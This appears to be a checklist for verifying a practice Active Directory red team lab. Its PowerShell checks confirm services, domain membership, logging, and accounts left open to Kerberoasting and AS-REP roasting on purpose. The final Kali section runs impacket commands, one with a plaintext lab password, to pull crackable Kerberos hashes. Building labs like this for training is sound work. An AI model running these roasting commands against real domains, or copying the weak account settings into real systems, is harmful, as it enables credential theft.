# Active Directory Lab Verification & Health Check Guide

Use this checklist to verify that each component of your Active Directory & Red Team laboratory is operating correctly at each stage.

---

## 1. Domain Controller Health Checks (Run on DC01)

### Check AD DS Service Status
```powershell
Get-Service -Name NTDS, ADWS, DNS, KDC, Netlogon | Select-Object Name, Status, StartType
```
*Expected*: All 5 services should show `Running` with `Automatic` start type.

### Check Active Directory Replication & Forest State
```powershell
dcdiag /v
Get-ADDomainController -Identity DC01 | Select-Object Name, Forest, OperatingSystem, IPv4Address
```

### Check Simulated Vulnerable Accounts & SPNs
```powershell
# 1. Verify Kerberoasting Target (svc_sql)
Get-ADUser -Identity svc_sql -Properties ServicePrincipalNames | Select-Object Name, ServicePrincipalNames

# 2. Verify AS-REP Roasting Target (svc_backup)
Get-ADUser -Identity svc_backup -Properties DoesNotRequirePreAuth | Select-Object Name, DoesNotRequirePreAuth

# 3. Verify SMB Shared Folder
Get-SmbShare -Name FinanceShare
```
*Expected*:
- `svc_sql` has `MSSQLSvc/dc01.adlab.test:1433` registered.
- `svc_backup` has `DoesNotRequirePreAuth` set to `True`.
- `FinanceShare` is active and accessible.

---

## 2. Workstation Domain Membership Checks (Run on CLIENT01 / CLIENT02)

```powershell
# Check domain status
(Get-CimInstance Win32_ComputerSystem).PartOfDomain
(Get-CimInstance Win32_ComputerSystem).Domain

# Test secure channel to DC01
Test-ComputerSecureChannel -Verbose

# Test DNS resolution for domain SRV records
Resolve-DnsName -Name _ldap._tcp.dc._msdcs.adlab.test
```
*Expected*:
- `PartOfDomain`: `True`
- `Domain`: `adlab.test`
- `Test-ComputerSecureChannel`: `True`

---

## 3. Telemetry & Auditing Health Checks (Run on Endpoints)

```powershell
# Verify Sysmon service
Get-Service -Name "Sysmon"

# Verify Process Creation with Command Line is enabled
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled"

# Verify PowerShell Script Block Logging is enabled
Get-ItemProperty -Path "HKLM:\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging"

# Query the most recent Sysmon events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 | Format-Table TimeCreated, Id, Message
```
*Expected*:
- `Sysmon`: `Running`
- `ProcessCreationIncludeCmdLine_Enabled`: `1`
- `EnableScriptBlockLogging`: `1`

---

## 4. Attacker Network & Emulation Connectivity (Run on Kali)

```bash
# Verify network routing to DC and Clients
ping -c 2 192.168.56.10
ping -c 2 192.168.56.20

# Test Kerberos AS-REP Roasting execution
impacket-GetNPUsers 'adlab.test/svc_backup' -no-pass -format hashcat -dc-ip 192.168.56.10

# Test Kerberoasting execution
impacket-GetUserSPNs 'adlab.test/asmith:Winter2026!Corporate' -dc-ip 192.168.56.10 -request
```
*Expected*:
- Both commands retrieve crackable Kerberos ticket hashes (`$krb5asrep$` and `$krb5tgs$`).
